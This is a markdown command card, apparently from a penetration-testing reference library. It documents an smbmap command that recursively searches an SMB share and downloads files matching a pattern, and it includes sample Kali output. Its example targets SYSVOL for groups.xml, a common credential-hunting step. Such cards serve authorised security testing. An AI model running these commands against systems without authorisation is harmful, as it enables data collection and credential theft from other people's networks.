---
id: e9918bd8-0003-4d1f-8821-775a72ae8989
name: smbmap-search-smb-share-recursively
type: command
executor: bash
data: >-
  smbmap -u $_USERNAME -p $_PASSWORD -R $_SHARE_NAME -H $_TARGET_IP -A
  $_FILENAME -q
output: |
  root@kali:~# smbmap -u bob -p secretpass -R stuff -H 10.10.10.10 -A secret -q
  [+] Finding open SMB ports....
  [+] User SMB session establishd on 10.10.10.10...
  [+] IP: 10.10.10.10:445 Name: 10.10.10.10 
          Disk                                                    Permissions
          ----                                                    -----------
          [+] Match found! Downloading: stuff\.\secret
          stuff                                                   READ ONLY
          [+] Starting search for files matching 'secret' on share stuff.
          [+] Match found! Downloading: stuff\secret
created_at: '2019-09-18T01:44:02.135506+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - collection
verified: true
validated: true
---

# smbmap-search-smb-share-recursively

## Command

```bash
smbmap -u $_USERNAME -p $_PASSWORD -R $_SHARE_NAME -H $_TARGET_IP -A $_FILENAME -q
```

## Description

Recursively searches and downloads files matching a pattern from an SMB share.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |
| -R $_SHARE_NAME | Recursive share | Yes |
| -H $_TARGET_IP | Target IP | Yes |
| -A $_FILENAME | Search pattern | Yes |
| -q | Quiet mode | Optional |

## Examples

### Search

```bash
smbmap -u user -p pass -R SYSVOL -H 10.10.10.10 -A groups.xml -q
```

## Expected Output

Matches and downloads logged.

## Related

- [[procedures/Search-and-Download-Files-from-SMB-Share]]
